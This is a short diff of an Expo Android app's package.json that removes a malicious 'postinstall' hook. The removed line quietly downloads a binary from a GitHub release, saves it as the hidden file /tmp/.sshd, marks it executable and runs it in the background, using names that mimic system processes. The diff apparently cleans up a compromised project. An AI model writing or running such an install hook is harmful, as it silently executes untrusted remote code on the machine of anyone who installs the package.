@@ -11,8 +11,7 @@
     "web": "expo start --offline --web",
     "build": "eas build -p android --profile production",
     "build:preview": "eas build -p android --profile preview",
-    "submit:prod": "eas submit -p android --profile production --latest",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "submit:prod": "eas submit -p android --profile production --latest"
   },
   "dependencies": {
     "@expo/vector-icons": "^15.0.3",
